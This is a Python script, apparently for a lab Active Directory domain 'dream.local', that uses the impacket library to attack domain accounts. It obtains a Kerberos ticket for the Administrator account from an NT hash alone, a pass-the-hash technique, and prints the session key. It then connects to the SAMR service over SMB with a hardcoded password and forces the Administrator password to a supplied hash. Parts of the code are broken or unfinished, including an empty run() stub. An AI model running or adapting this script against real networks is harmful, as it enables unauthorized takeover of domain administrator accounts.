from impacket.krb5.kerberosv5 import getKerberosTGT
from impacket.examples.utils import parse_target
from impacket.krb5.types import Principal
from impacket.krb5 import constants
from impacket.dcerpc.v5 import transport, samr
from binascii import hexlify
from impacket.examples import logger
import logging


def run(userName, password, domain, lmhash, nthash, aesKey, kdcHost, service):
	userName = Principal("dream.local/Administrator", constants.PrincipalNameType.NT_PRINCIPAL)

def hSamrChangePasswordUser(username, domain, address):
		rpctransport = transport.SMBTransport(address, filename=r'\samr')
		rpctransport.set_credentials(username, '!QAZ2wsx', domain, '', '', aesKey='')
		dce = rpctransport.get_dce_rpc()
		dce.connect()
		dce.bind(samr.MSRPC_UUID_SAMR)
		try:
			serverHandle = samr.hSamrConnect(dce, address + '\x00')['ServerHandle']
			domainSID = samr.hSamrLookupDomainInSamServer(dce, serverHandle, domain)['DomainId']
			domainHandle = samr.hSamrOpenDomain(dce, serverHandle, domainId=domainSID)['DomainHandle']
			userRID = samr.hSamrLookupNamesInDomain(dce, domainHandle, (username,))['RelativeIds']['Element'][0]
			userHandle = samr.hSamrOpenUser(dce, domainHandle, userId=userRID)['UserHandle']
		except Exception as e:
			print(e)

		try:
			resp = samr.hSamrChangePasswordUser(dce, userHandle, '!QAZ2wsx', newPassword='', oldPwdHashNT='',
                                                newPwdHashLM='', newPwdHashNT="3B24C391862F4A8531A245A0217708C4")
		except Exception as e:
			print(e)

if __name__ == '__main__':
	logger.init(False, True)
	userName = Principal("Administrator@DREAM-DC.dream.local", type=1)
	print(type(userName))

	tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(clientName = userName,password = None,domain = "dream.local",lmhash = None ,nthash = "3B24C391862F4A8531A245A0217708C4",aesKey = None,kdcHost = "192.168.178.179",serverName = None)
	
	#run()
	print(hexlify(sessionKey.contents).decode('utf-8'))

	domain, username, oldPassword, address = parse_target("dream.local/Administrator@DREAM-DC.dream.local")
	hSamrChangePasswordUser(username, domain, address)
